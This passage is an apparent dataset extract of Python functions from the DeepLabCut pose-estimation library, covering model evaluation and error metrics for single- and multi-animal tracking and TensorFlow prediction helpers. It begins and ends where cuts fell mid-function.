        from deeplabcut.pose_estimation_tensorflow.datasets.utils import data_to_input
        from deeplabcut.utils import auxiliaryfunctions, conversioncode
        import tensorflow as tf
        plotting = bool(plotting)
        if 'TF_CUDNN_USE_AUTOTUNE' in os.environ:
            del os.environ['TF_CUDNN_USE_AUTOTUNE']
        tf.compat.v1.reset_default_graph()
        os.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'
        start_path = os.getcwd()
        cfg = auxiliaryfunctions.read_config(config)
        if gputouse is not None:
            os.environ['CUDA_VISIBLE_DEVICES'] = str(gputouse)
        if trainingsetindex == 'all':
            TrainingFractions = cfg['TrainingFraction']
        elif 0 <= trainingsetindex < len(cfg['TrainingFraction']):
            TrainingFractions = [cfg['TrainingFraction'][int(trainingsetindex)]]
        else:
            raise Exception('Please check the trainingsetindex! ', trainingsetindex, ' should be an integer from 0 .. ', int(len(cfg['TrainingFraction']) - 1))
        trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
        Data = pd.read_hdf(os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5'))
        comparisonbodyparts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, comparisonbodyparts)
        auxiliaryfunctions.attempt_to_make_folder(str(cfg['project_path'] + '/evaluation-results/'))
        for shuffle in Shuffles:
            for trainFraction in TrainingFractions:
                modelfolder_rel_path = auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)
                modelfolder = Path(cfg['project_path']) / modelfolder_rel_path
                if not modelfolder.exists():
                    raise FileNotFoundError(f'Model with shuffle {shuffle} and trainFraction {trainFraction} does not exist.')
                if trainingsetindex == 'all':
                    train_frac_idx = cfg['TrainingFraction'].index(trainFraction)
                else:
                    train_frac_idx = trainingsetindex
                (path_train_config, path_test_config, _) = return_train_network_path(config=config, shuffle=shuffle, trainingsetindex=train_frac_idx, modelprefix=modelprefix)
                test_pose_cfg = load_config(str(path_test_config))
                train_pose_cfg = load_config(str(path_train_config))
                (_, trainIndices, testIndices, _) = auxiliaryfunctions.load_metadata(Path(cfg['project_path'], train_pose_cfg['metadataset']))
                test_pose_cfg['batch_size'] = 1
                evaluationfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_evaluation_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
                auxiliaryfunctions.attempt_to_make_folder(evaluationfolder, recursive=True)
                Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(str(modelfolder), 'train')) if 'index' in fn])
                try:
                    Snapshots[0]
                except IndexError:
                    raise FileNotFoundError(""Snapshots not found! It seems the dataset for shuffle %s and trainFraction %s is not trained.\nPlease train it before evaluating.\nUse the function 'train_network' to do so."" % (shuffle, trainFraction))
                increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
                Snapshots = Snapshots[increasing_indices]
                if cfg['snapshotindex'] == -1:
                    snapindices = [-1]
                elif cfg['snapshotindex'] == 'all':
                    snapindices = range(len(Snapshots))
                elif cfg['snapshotindex'] < len(Snapshots):
                    snapindices = [cfg['snapshotindex']]
                else:
                    raise ValueError('Invalid choice, only -1 (last), any integer up to last, or all (as string)!')
                final_result = []
                if rescale:
                    scale = test_pose_cfg['global_scale']
                    Data = pd.read_hdf(os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5')) * scale
                else:
                    scale = 1
                conversioncode.guarantee_multiindex_rows(Data)
                for snapindex in snapindices:
                    test_pose_cfg['init_weights'] = os.path.join(str(modelfolder), 'train', Snapshots[snapindex])
                    trainingsiterations = test_pose_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
                    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations, modelprefix=modelprefix)
                    print('Running ', DLCscorer, ' with # of training iterations:', trainingsiterations)
                    (notanalyzed, resultsfilename, DLCscorer) = auxiliaryfunctions.check_if_not_evaluated(str(evaluationfolder), DLCscorer, DLCscorerlegacy, Snapshots[snapindex])
                    if notanalyzed:
                        (sess, inputs, outputs) = predict.setup_pose_prediction(test_pose_cfg)
                        Numimages = len(Data.index)
                        PredicteData = np.zeros((Numimages, 3 * len(test_pose_cfg['all_joints_names'])))
                        print('Running evaluation ...')
                        for (imageindex, imagename) in tqdm(enumerate(Data.index)):
                            image = imread(os.path.join(cfg['project_path'], *imagename), mode='skimage')
                            if scale != 1:
                                image = imresize(image, scale)
                            image_batch = data_to_input(image)
                            outputs_np = sess.run(outputs, feed_dict={inputs: image_batch})
                            (scmap, locref) = predict.extract_cnn_output(outputs_np, test_pose_cfg)
                            pose = predict.argmax_pose_predict(scmap, locref, test_pose_cfg['stride'])
                            PredicteData[imageindex, :] = pose.flatten()
                        sess.close()
                        index = pd.MultiIndex.from_product([[DLCscorer], test_pose_cfg['all_joints_names'], ['x', 'y', 'likelihood']], names=['scorer', 'bodyparts', 'coords'])
                        DataMachine = pd.DataFrame(PredicteData, columns=index, index=Data.index)
                        DataMachine.to_hdf(resultsfilename, 'df_with_missing')
                        print('Analysis is done and the results are stored (see evaluation-results) for snapshot: ', Snapshots[snapindex])
                        DataCombined = pd.concat([Data.T, DataMachine.T], axis=0, sort=False).T
                        (RMSE, RMSEpcutoff) = pairwisedistances(DataCombined, cfg['scorer'], DLCscorer, cfg['pcutoff'], comparisonbodyparts)
                        testerror = np.nanmean(RMSE.iloc[testIndices].values.flatten())
                        trainerror = np.nanmean(RMSE.iloc[trainIndices].values.flatten())
                        testerrorpcutoff = np.nanmean(RMSEpcutoff.iloc[testIndices].values.flatten())
                        trainerrorpcutoff = np.nanmean(RMSEpcutoff.iloc[trainIndices].values.flatten())
                        results = [trainingsiterations, int(100 * trainFraction), shuffle, np.round(trainerror, 2), np.round(testerror, 2), cfg['pcutoff'], np.round(trainerrorpcutoff, 2), np.round(testerrorpcutoff, 2)]
                        final_result.append(results)
                        if per_keypoint_evaluation:
                            df_keypoint_error = keypoint_error(RMSE, RMSEpcutoff, trainIndices, testIndices)
                            kpt_filename = DLCscorer + '-keypoint-results.csv'
                            df_keypoint_error.to_csv(Path(evaluationfolder) / kpt_filename)
                        if show_errors:
                            print('Results for', trainingsiterations, ' training iterations:', int(100 * trainFraction), shuffle, 'train error:', np.round(trainerror, 2), 'pixels. Test error:', np.round(testerror, 2), ' pixels.')
                            print('With pcutoff of', cfg['pcutoff'], ' train error:', np.round(trainerrorpcutoff, 2), 'pixels. Test error:', np.round(testerrorpcutoff, 2), 'pixels')
                            if scale != 1:
                                print('The predictions have been calculated for rescaled images (and rescaled ground truth). Scale:', scale)
                            print('Thereby, the errors are given by the average distances between the labels by DLC and the scorer.')
                        if plotting:
                            print('Plotting...')
                            foldername = os.path.join(str(evaluationfolder), 'LabeledImages_' + DLCscorer + '_' + Snapshots[snapindex])
                            auxiliaryfunctions.attempt_to_make_folder(foldername)
                            Plotting(cfg, comparisonbodyparts, DLCscorer, trainIndices, DataCombined * 1.0 / scale, foldername)
                        tf.compat.v1.reset_default_graph()
                    else:
                        DataMachine = pd.read_hdf(resultsfilename)
                        conversioncode.guarantee_multiindex_rows(DataMachine)
                        if plotting:
                            DataCombined = pd.concat([Data.T, DataMachine.T], axis=0, sort=False).T
                            foldername = os.path.join(str(evaluationfolder), 'LabeledImages_' + DLCscorer + '_' + Snapshots[snapindex])
                            if not os.path.exists(foldername):
                                print('Plotting...(attention scale might be inconsistent in comparison to when data was analyzed; i.e. if you used rescale)')
                                auxiliaryfunctions.attempt_to_make_folder(foldername)
                                Plotting(cfg, comparisonbodyparts, DLCscorer, trainIndices, DataCombined * 1.0 / scale, foldername)
                            else:
                                print('Plots already exist for this snapshot... Skipping to the next one.')
                if len(final_result) > 0:
                    make_results_file(final_result, evaluationfolder, DLCscorer)
                    print(""The network is evaluated and the results are stored in the subdirectory 'evaluation_results'."")
                    print(""Please check the results, then choose the best model (snapshot) for prediction. You can update the config.yaml file with the appropriate index for the 'snapshotindex'.\nUse the function 'analyze_video' to make predictions on new videos."")
                    print('Otherwise, consider adding more labeled-data and retraining the network (see DeepLabCut workflow Fig 2, Nath 2019)')
    os.chdir(str(start_path))"
AlexEMG/DeepLabCut,make_results_file,"def make_results_file(final_result, evaluationfolder, DLCscorer):
    """"""
    Makes result file in csv format and saves under evaluation_results directory.
    If the file exists (typically, when the network has already been evaluated),
    newer results are appended to it.
    """"""
    col_names = ['Training iterations:', '%Training dataset', 'Shuffle number', ' Train error(px)', ' Test error(px)', 'p-cutoff used', 'Train error with p-cutoff', 'Test error with p-cutoff']
    df = pd.DataFrame(final_result, columns=col_names)
    output_path = os.path.join(str(evaluationfolder), DLCscorer + '-results.csv')
    if os.path.exists(output_path):
        temp = pd.read_csv(output_path, index_col=0)
        df = pd.concat((temp, df)).reset_index(drop=True)
    df.to_csv(output_path)
    df = pd.DataFrame(final_result, columns=col_names)
    output_path = os.path.join(str(Path(evaluationfolder).parents[0]), 'CombinedEvaluation-results.csv')
    if os.path.exists(output_path):
        temp = pd.read_csv(output_path, index_col=0)
        df = pd.concat((temp, df)).reset_index(drop=True)
    df.to_csv(output_path)"
AlexEMG/DeepLabCut,_percentile,"def _percentile(n):

    def percentile_(x):
        return x.quantile(n)
    percentile_.__name__ = f'percentile_{100 * n:.0f}'
    return percentile_"
AlexEMG/DeepLabCut,_compute_stats,"def _compute_stats(df):
    return df.agg(['min', 'max', 'mean', np.std, _percentile(0.25), _percentile(0.5), _percentile(0.75)]).stack(level=1)"
AlexEMG/DeepLabCut,_find_closest_neighbors,"def _find_closest_neighbors(xy_true, xy_pred, k=5):
    n_preds = xy_pred.shape[0]
    tree = cKDTree(xy_pred)
    (dist, inds) = tree.query(xy_true, k=k)
    idx = np.argsort(dist[:, 0])
    neighbors = np.full(len(xy_true), -1, dtype=int)
    picked = set()
    for (i, ind) in enumerate(inds[idx]):
        for j in ind:
            if j not in picked:
                picked.add(j)
                neighbors[idx[i]] = j
                break
        if len(picked) == n_preds:
            break
    return neighbors"
AlexEMG/DeepLabCut,_calc_prediction_error,"def _calc_prediction_error(data):
    _ = data.pop('metadata', None)
    dists = []
    for (n, dict_) in enumerate(tqdm(data.values())):
        gt = np.concatenate(dict_['groundtruth'][1])
        xy = np.concatenate(dict_['prediction']['coordinates'][0])
        p = np.concatenate(dict_['prediction']['confidence'])
        neighbors = _find_closest_neighbors(gt, xy)
        found = neighbors != -1
        gt2 = gt[found]
        xy2 = xy[neighbors[found]]
        dists.append(np.c_[np.linalg.norm(gt2 - xy2, axis=1), p[neighbors[found]]])
    return dists"
AlexEMG/DeepLabCut,_calc_train_test_error,"def _calc_train_test_error(data, metadata, pcutoff=0.3):
    train_inds = set(metadata['data']['trainIndices'])
    dists = _calc_prediction_error(data)
    (dists_train, dists_test) = ([], [])
    for (n, dist) in enumerate(dists):
        if n in train_inds:
            dists_train.append(dist)
        else:
            dists_test.append(dist)
    dists_train = np.concatenate(dists_train)
    dists_test = np.concatenate(dists_test)
    error_train = np.nanmean(dists_train[:, 0])
    error_train_cut = np.nanmean(dists_train[dists_train[:, 1] >= pcutoff, 0])
    error_test = np.nanmean(dists_test[:, 0])
    error_test_cut = np.nanmean(dists_test[dists_test[:, 1] >= pcutoff, 0])
    return (error_train, error_test, error_train_cut, error_test_cut)"
AlexEMG/DeepLabCut,evaluate_multianimal_full,"def evaluate_multianimal_full(config, Shuffles=[1], trainingsetindex=0, plotting=False, show_errors=True, comparisonbodyparts='all', gputouse=None, modelprefix='', per_keypoint_evaluation: bool=False):
    from deeplabcut.pose_estimation_tensorflow.core import predict, predict_multianimal as predictma
    from deeplabcut.utils import auxiliaryfunctions, auxfun_multianimal, auxfun_videos, conversioncode
    import tensorflow as tf
    if 'TF_CUDNN_USE_AUTOTUNE' in os.environ:
        del os.environ['TF_CUDNN_USE_AUTOTUNE']
    tf.compat.v1.reset_default_graph()
    os.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'
    if gputouse is not None:
        os.environ['CUDA_VISIBLE_DEVICES'] = str(gputouse)
    start_path = os.getcwd()
    if plotting is True:
        plotting = 'bodypart'
    cfg = auxiliaryfunctions.read_config(config)
    if trainingsetindex == 'all':
        TrainingFractions = cfg['TrainingFraction']
    else:
        TrainingFractions = [cfg['TrainingFraction'][trainingsetindex]]
    trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
    Data = pd.read_hdf(os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5'))
    conversioncode.guarantee_multiindex_rows(Data)
    comparisonbodyparts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, comparisonbodyparts)
    all_bpts = np.asarray(len(cfg['individuals']) * cfg['multianimalbodyparts'] + cfg['uniquebodyparts'])
    colors = visualization.get_cmap(len(comparisonbodyparts), name=cfg['colormap'])
    auxiliaryfunctions.attempt_to_make_folder(str(cfg['project_path'] + '/evaluation-results/'))
    for shuffle in Shuffles:
        for trainFraction in TrainingFractions:
            modelfolder_rel_path = auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)
            modelfolder = Path(cfg['project_path']) / modelfolder_rel_path
            if not modelfolder.exists():
                raise FileNotFoundError(f'Model with shuffle {shuffle} and trainFraction {trainFraction} does not exist.')
            if trainingsetindex == 'all':
                train_frac_idx = cfg['TrainingFraction'].index(trainFraction)
            else:
                train_frac_idx = trainingsetindex
            (path_train_config, path_test_config, _) = return_train_network_path(config=config, shuffle=shuffle, trainingsetindex=train_frac_idx, modelprefix=modelprefix)
            test_pose_cfg = load_config(str(path_test_config))
            train_pose_cfg = load_config(str(path_train_config))
            (_, trainIndices, testIndices, _) = auxiliaryfunctions.load_metadata(os.path.join(cfg['project_path'], train_pose_cfg['metadataset']))
            pipeline = iaa.Sequential(random_order=False)
            pre_resize = test_pose_cfg.get('pre_resize')
            if pre_resize:
                (width, height) = pre_resize
                pipeline.add(iaa.Resize({'height': height, 'width': width}))
            test_pose_cfg['batch_size'] = 1
            stride = test_pose_cfg['stride']
            _ = test_pose_cfg.pop('paf_best', None)
            joints = test_pose_cfg['all_joints_names']
            evaluationfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_evaluation_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
            auxiliaryfunctions.attempt_to_make_folder(evaluationfolder, recursive=True)
            Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(str(modelfolder), 'train')) if 'index' in fn])
            if len(Snapshots) == 0:
                print(""Snapshots not found! It seems the dataset for shuffle %s and trainFraction %s is not trained.\nPlease train it before evaluating.\nUse the function 'train_network' to do so."" % (shuffle, trainFraction))
            else:
                increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
                Snapshots = Snapshots[increasing_indices]
                if cfg['snapshotindex'] == -1:
                    snapindices = [-1]
                elif cfg['snapshotindex'] == 'all':
                    snapindices = range(len(Snapshots))
                elif cfg['snapshotindex'] < len(Snapshots):
                    snapindices = [cfg['snapshotindex']]
                else:
                    print('Invalid choice, only -1 (last), any integer up to last, or all (as string)!')
                final_result = []
                for snapindex in snapindices:
                    test_pose_cfg['init_weights'] = os.path.join(str(modelfolder), 'train', Snapshots[snapindex])
                    trainingsiterations = test_pose_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
                    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations, modelprefix=modelprefix)
                    print('Running ', DLCscorer, ' with # of trainingiterations:', trainingsiterations)
                    (notanalyzed, resultsfilename, DLCscorer) = auxiliaryfunctions.check_if_not_evaluated(str(evaluationfolder), DLCscorer, DLCscorerlegacy, Snapshots[snapindex])
                    data_path = resultsfilename.split('.h5')[0] + '_full.pickle'
                    if plotting:
                        foldername = os.path.join(str(evaluationfolder), 'LabeledImages_' + DLCscorer + '_' + Snapshots[snapindex])
                        auxiliaryfunctions.attempt_to_make_folder(foldername)
                        if plotting == 'bodypart':
                            (fig, ax) = visualization.create_minimal_figure()
                    if os.path.isfile(data_path):
                        print('Model already evaluated.', resultsfilename)
                    else:
                        (sess, inputs, outputs) = predict.setup_pose_prediction(test_pose_cfg)
                        PredicteData = {}
                        dist = np.full((len(Data), len(all_bpts)), np.nan)
                        conf = np.full_like(dist, np.nan)
                        print('Network Evaluation underway...')
                        for (imageindex, imagename) in tqdm(enumerate(Data.index)):
                            image_path = os.path.join(cfg['project_path'], *imagename)
                            frame = auxfun_videos.imread(image_path, mode='skimage')
                            GT = Data.iloc[imageindex]
                            if not GT.any():
                                continue
                            keypoints = [GT.to_numpy().reshape((-1, 2)).astype(float)]
                            (frame_, keypoints) = pipeline(images=[frame], keypoints=keypoints)
                            frame = frame_[0]
                            GT[:] = keypoints[0].flatten()
                            df = GT.unstack('coords').reindex(joints, level='bodyparts')
                            groundtruthidentity = list(df.index.get_level_values('individuals').to_numpy().reshape((-1, 1)))
                            groundtruthcoordinates = list(df.values[:, np.newaxis])
                            for (i, coords) in enumerate(groundtruthcoordinates):
                                if np.isnan(coords).any():
                                    groundtruthcoordinates[i] = np.empty((0, 2), dtype=float)
                                    groundtruthidentity[i] = np.array([], dtype=str)
                            temp = df.reset_index(level='bodyparts').dropna()
                            temp['bodyparts'].replace(dict(zip(joints, range(len(joints)))), inplace=True)
                            temp['sample'] = 0
                            peaks_gt = temp.loc[:, ['sample', 'y', 'x', 'bodyparts']].to_numpy()
                            peaks_gt[:, 1:3] = (peaks_gt[:, 1:3] - stride // 2) / stride
                            pred = predictma.predict_batched_peaks_and_costs(test_pose_cfg, np.expand_dims(frame, axis=0), sess, inputs, outputs, peaks_gt.astype(int))
                            if not pred:
                                continue
                            else:
                                pred = pred[0]
                            PredicteData[imagename] = {}
                            PredicteData[imagename]['index'] = imageindex
                            PredicteData[imagename]['prediction'] = pred
                            PredicteData[imagename]['groundtruth'] = [groundtruthidentity, groundtruthcoordinates, GT]
                            coords_pred = pred['coordinates'][0]
                            probs_pred = pred['confidence']
                            for (bpt, xy_gt) in df.groupby(level='bodyparts'):
                                inds_gt = np.flatnonzero(np.all(~np.isnan(xy_gt), axis=1))
                                n_joint = joints.index(bpt)
                                xy = coords_pred[n_joint]
                                if inds_gt.size and xy.size:
                                    xy_gt_values = xy_gt.iloc[inds_gt].values
                                    neighbors = _find_closest_neighbors(xy_gt_values, xy, k=3)
                                    found = neighbors != -1
                                    min_dists = np.linalg.norm(xy_gt_values[found] - xy[neighbors[found]], axis=1)
                                    inds = np.flatnonzero(all_bpts == bpt)
                                    sl = (imageindex, inds[inds_gt[found]])
                                    dist[sl] = min_dists
                                    conf[sl] = probs_pred[n_joint][neighbors[found]].squeeze()
                            if plotting == 'bodypart':
                                temp_xy = GT.unstack('bodyparts')[joints].values
                                gt = temp_xy.reshape((-1, 2, temp_xy.shape[1])).T.swapaxes(1, 2)
                                (h, w, _) = np.shape(frame)
                                fig.set_size_inches(w / 100, h / 100)
                                ax.set_xlim(0, w)
                                ax.set_ylim(0, h)
                                ax.invert_yaxis()
                                ax = visualization.make_multianimal_labeled_image(frame, gt, coords_pred, probs_pred, colors, cfg['dotsize'], cfg['alphavalue'], cfg['pcutoff'], ax=ax)
                                visualization.save_labeled_frame(fig, image_path, foldername, imageindex in trainIndices)
                                visualization.erase_artists(ax)
                        sess.close()
                        df_dist = pd.DataFrame(dist, columns=df.index)
                        df_conf = pd.DataFrame(conf, columns=df.index)
                        df_joint = pd.concat([df_dist, df_conf], keys=['rmse', 'conf'], names=['metrics'], axis=1)
                        df_joint = df_joint.reorder_levels(list(np.roll(df_joint.columns.names, -1)), axis=1)
                        df_joint.sort_index(axis=1, level=['individuals', 'bodyparts'], ascending=[True, True], inplace=True)
                        write_path = os.path.join(evaluationfolder, f'dist_{trainingsiterations}.csv')
                        df_joint.to_csv(write_path)
                        error = df_joint.xs('rmse', level='metrics', axis=1)
                        mask = df_joint.xs('conf', level='metrics', axis=1) >= cfg['pcutoff']
                        error_masked = error[mask]
                        error_train = np.nanmean(error.iloc[trainIndices])
                        error_train_cut = np.nanmean(error_masked.iloc[trainIndices])
                        error_test = np.nanmean(error.iloc[testIndices])
                        error_test_cut = np.nanmean(error_masked.iloc[testIndices])
                        results = [trainingsiterations, int(100 * trainFraction), shuffle, np.round(error_train, 2), np.round(error_test, 2), cfg['pcutoff'], np.round(error_train_cut, 2), np.round(error_test_cut, 2)]
                        final_result.append(results)
                        if per_keypoint_evaluation:
                            df_keypoint_error = keypoint_error(error, error[mask], trainIndices, testIndices)
                            kpt_filename = DLCscorer + '-keypoint-results.csv'
                            df_keypoint_error.to_csv(Path(evaluationfolder) / kpt_filename)
                        if show_errors:
                            string = 'Results for {} training iterations, training fraction of {}, and shuffle {}:\nTrain error: {} pixels. Test error: {} pixels.\nWith pcutoff of {}:\nTrain error: {} pixels. Test error: {} pixels.'
                            print(string.format(*results))
                            print('##########################################')
                            print('Average Euclidean distance to GT per individual (in pixels; test-only)')
                            print(error_masked.iloc[testIndices].groupby('individuals', axis=1).mean().mean().to_string())
                            print('Average Euclidean distance to GT per bodypart (in pixels; test-only)')
                            print(error_masked.iloc[testIndices].groupby('bodyparts', axis=1).mean().mean().to_string())
                        PredicteData['metadata'] = {'nms radius': test_pose_cfg['nmsradius'], 'minimal confidence': test_pose_cfg['minconfidence'], 'sigma': test_pose_cfg.get('sigma', 1), 'PAFgraph': test_pose_cfg['partaffinityfield_graph'], 'PAFinds': np.arange(len(test_pose_cfg['partaffinityfield_graph'])), 'all_joints': [[i] for i in range(len(test_pose_cfg['all_joints']))], 'all_joints_names': [test_pose_cfg['all_joints_names'][i] for i in range(len(test_pose_cfg['all_joints']))], 'stride': test_pose_cfg.get('stride', 8)}
                        print('Done and results stored for snapshot: ', Snapshots[snapindex])
                        dictionary = {'Scorer': DLCscorer, 'DLC-model-config file': test_pose_cfg, 'trainIndices': trainIndices, 'testIndices': testIndices, 'trainFraction': trainFraction}
                        metadata = {'data': dictionary}
                        _ = auxfun_multianimal.SaveFullMultiAnimalData(PredicteData, metadata, resultsfilename)
                        tf.compat.v1.reset_default_graph()
                    n_multibpts = len(cfg['multianimalbodyparts'])
                    if n_multibpts == 1:
                        continue
                    max_n_edges = n_multibpts * (n_multibpts - 1) // 2
                    n_edges = len(test_pose_cfg['partaffinityfield_graph'])
                    if n_edges == max_n_edges:
                        print('Selecting best skeleton...')
                        n_graphs = 10
                        paf_inds = None
                    else:
                        n_graphs = 1
                        paf_inds = [list(range(n_edges))]
                    (results, paf_scores, best_assemblies) = crossvalutils.cross_validate_paf_graphs(config, str(path_test_config).replace('pose_', 'inference_'), data_path, data_path.replace('_full.', '_meta.'), n_graphs=n_graphs, paf_inds=paf_inds, oks_sigma=test_pose_cfg.get('oks_sigma', 0.1), margin=test_pose_cfg.get('bbox_margin', 0), symmetric_kpts=test_pose_cfg.get('symmetric_kpts'))
                    if plotting == 'individual':
                        (assemblies, assemblies_unique, image_paths) = best_assemblies
                        (fig, ax) = visualization.create_minimal_figure()
                        n_animals = len(cfg['individuals'])
                        if cfg['uniquebodyparts']:
                            n_animals += 1
                        colors = visualization.get_cmap(n_animals, name=cfg['colormap'])
                        for (k, v) in tqdm(assemblies.items()):
                            imname = image_paths[k]
                            image_path = os.path.join(cfg['project_path'], *imname)
                            frame = auxfun_videos.imread(image_path, mode='skimage')
                            (h, w, _) = np.shape(frame)
                            fig.set_size_inches(w / 100, h / 100)
                            ax.set_xlim(0, w)
                            ax.set_ylim(0, h)
                            ax.invert_yaxis()
                            gt = [s.to_numpy().reshape((-1, 2)) for (_, s) in Data.loc[imname].groupby('individuals')]
                            coords_pred = []
                            coords_pred += [ass.xy for ass in v]
                            probs_pred = []
                            probs_pred += [ass.data[:, 2:3] for ass in v]
                            if assemblies_unique is not None:
                                unique = assemblies_unique.get(k, None)
                                if unique is not None:
                                    coords_pred.append(unique[:, :2])
                                    probs_pred.append(unique[:, 2:3])
                            while len(coords_pred) < len(gt):
                                coords_pred.append(np.full((1, 2), np.nan))
                                probs_pred.append(np.full((1, 2), np.nan))
                            ax = visualization.make_multianimal_labeled_image(frame, gt, coords_pred, probs_pred, colors, cfg['dotsize'], cfg['alphavalue'], cfg['pcutoff'], ax=ax)
                            visualization.save_labeled_frame(fig, image_path, foldername, k in trainIndices)
                            visualization.erase_artists(ax)
                    df = results[1].copy()
                    df.loc(axis=0)['mAP_train', 'mean'] = [d[0]['mAP'] for d in results[2]]
                    df.loc(axis=0)['mAR_train', 'mean'] = [d[0]['mAR'] for d in results[2]]
                    df.loc(axis=0)['mAP_test', 'mean'] = [d[1]['mAP'] for d in results[2]]
                    df.loc(axis=0)['mAR_test', 'mean'] = [d[1]['mAR'] for d in results[2]]
                    with open(data_path.replace('_full.', '_map.'), 'wb') as file:
                        pickle.dump((df, paf_scores), file)
                if len(final_result) > 0:
                    make_results_file(final_result, evaluationfolder, DLCscorer)
    os.chdir(str(start_path))"
AlexEMG/DeepLabCut,percentile_,"def percentile_(x):
    return x.quantile(n)"
AlexEMG/DeepLabCut,setup_pose_prediction,"def setup_pose_prediction(cfg, allow_growth=False, collect_extra=False):
    tf.compat.v1.reset_default_graph()
    inputs = tf.compat.v1.placeholder(tf.float32, shape=[cfg['batch_size'], None, None, 3])
    net_heads = PoseNetFactory.create(cfg).test(inputs)
    extra_dict = {}
    outputs = [net_heads['part_prob']]
    if cfg['location_refinement']:
        outputs.append(net_heads['locref'])
    if 'multi-animal' in cfg['dataset_type'] and cfg['partaffinityfield_predict']:
        print('Activating extracting of PAFs')
        outputs.append(net_heads['pairwise_pred'])
    outputs.append(net_heads['peak_inds'])
    if collect_extra:
        extra_dict['features'] = net_heads['features']
    restorer = tf.compat.v1.train.Saver()
    if allow_growth:
        config = tf.compat.v1.ConfigProto()
        config.gpu_options.allow_growth = True
        sess = tf.compat.v1.Session(config=config)
    else:
        sess = tf.compat.v1.Session()
    sess.run(tf.compat.v1.global_variables_initializer())
    sess.run(tf.compat.v1.local_variables_initializer())
    restorer.restore(sess, cfg['init_weights'])
    if collect_extra:
        return (sess, inputs, outputs, extra_dict)
    else:
        return (sess, inputs, outputs)"
AlexEMG/DeepLabCut,extract_cnn_output,"def extract_cnn_output(outputs_np, cfg):
    """"""extract locref + scmap from network""""""
    scmap = outputs_np[0]
    scmap = np.squeeze(scmap)
    locref = None
    if cfg['location_refinement']:
        locref = np.squeeze(outputs_np[1])
        shape = locref.shape
        locref = np.reshape(locref, (shape[0], shape[1], -1, 2))
        locref *= cfg['locref_stdev']
    if len(scmap.shape) == 2:
        scmap = np.expand_dims(scmap, axis=2)
    return (scmap, locref)"
AlexEMG/DeepLabCut,argmax_pose_predict,"def argmax_pose_predict(scmap, offmat, stride):
    """"""Combine scoremat and offsets to the final pose.""""""
    num_joints = scmap.shape[2]
    pose = []
    for joint_idx in range(num_joints):
        maxloc = np.unravel_index(np.argmax(scmap[:, :, joint_idx]), scmap[:, :, joint_idx].shape)
        offset = np.array(offmat[maxloc][joint_idx])[::-1]
        pos_f8 = np.array(maxloc).astype('float') * stride + 0.5 * stride + offset
        pose.append(np.hstack((pos_f8[::-1], [scmap[maxloc][joint_idx]])))
    return np.array(pose)"
AlexEMG/DeepLabCut,multi_pose_predict,"def multi_pose_predict(scmap, locref, stride, num_outputs):
    (Y, X) = get_top_values(scmap[None], num_outputs)
    (Y, X) = (Y[:, 0], X[:, 0])
    num_joints = scmap.shape[2]
    DZ = np.zeros((num_outputs, num_joints, 3))
    for m in range(num_outputs):
        for k in range(num_joints):
            x = X[m, k]
            y = Y[m, k]
            DZ[m, k, :2] = locref[y, x, k, :]
            DZ[m, k, 2] = scmap[y, x, k]
    X = X.astype('float32') * stride + 0.5 * stride + DZ[:, :, 0]
    Y = Y.astype('float32') * stride + 0.5 * stride + DZ[:, :, 1]
    P = DZ[:, :, 2]
    pose = np.empty((num_joints, num_outputs * 3), dtype='float32')
    pose[:, 0::3] = X.T
    pose[:, 1::3] = Y.T
    pose[:, 2::3] = P.T
    return pose"
AlexEMG/DeepLabCut,getpose,"def getpose(image, cfg, sess, inputs, outputs, outall=False):
    """"""Extract pose""""""
    im = np.expand_dims(image, axis=0).astype(float)
    outputs_np = sess.run(outputs, feed_dict={inputs: im})
    (scmap, locref) = extract_cnn_output(outputs_np, cfg)
    num_outputs = cfg.get('num_outputs', 1)
    if num_outputs > 1:
        pose = multi_pose_predict(scmap, locref, cfg['stride'], num_outputs)
    else:
        pose = argmax_pose_predict(scmap, locref, cfg['stride'])
    if outall:
        return (scmap, locref, pose)
    else:
        return pose"
AlexEMG/DeepLabCut,extract_cnn_outputmulti,"def extract_cnn_outputmulti(outputs_np, cfg):
    """"""extract locref + scmap from network
    Dimensions: image batch x imagedim1 x imagedim2 x bodypart""""""
    scmap = outputs_np[0]
    locref = None
    if cfg['location_refinement']:
        locref = outputs_np[1]
        shape = locref.shape
        locref = np.reshape(locref, (shape[0], shape[1], shape[2], -1, 2))
        locref *= cfg['locref_stdev']
    if len(scmap.shape) == 2:
        scmap = np.expand_dims(scmap, axis=2)
    return (scmap, locref)"
AlexEMG/DeepLabCut,get_top_values,"def get_top_values(scmap, n_top=5):
    (batchsize, ny, nx, num_joints) = scmap.shape
    scmap_flat = scmap.reshape(batchsize, nx * ny, num_joints)
    if n_top == 1:
        scmap_top = np.argmax(scmap_flat, axis=1)[None]
    else:
        scmap_top = np.argpartition(scmap_flat, -n_top, axis=1)[:, -n_top:]
        for ix in range(batchsize):
            vals = scmap_flat[ix, scmap_top[ix], np.arange(num_joints)]
            arg = np.argsort(-vals, axis=0)
            scmap_top[ix] = scmap_top[ix, arg, np.arange(num_joints)]
